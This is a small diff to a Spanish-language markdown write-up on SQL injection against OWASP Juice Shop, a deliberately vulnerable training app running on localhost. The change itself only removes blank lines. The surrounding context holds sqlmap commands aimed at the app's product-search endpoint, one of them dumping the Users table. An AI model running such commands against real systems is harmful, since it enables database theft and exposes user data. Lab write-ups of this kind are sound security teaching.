@@ -187,7 +187,6 @@ Y mostrará contenido sensible desde tablas como:
 
 - **A3: Injection**
 - **A1: Broken Object Level Authorization (BOLA)** *(potencial en otros endpoints)*
-
 ---
 
 ## Resumen de Comandos
@@ -208,7 +207,6 @@ python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" --batch
 # Extraer tabla Users
 python sqlmap.py -u "http://localhost:3000/rest/products/search?q=apple" -D juice_shop -T Users --dump
 ```
-
 ---
 
 ## Conclusión
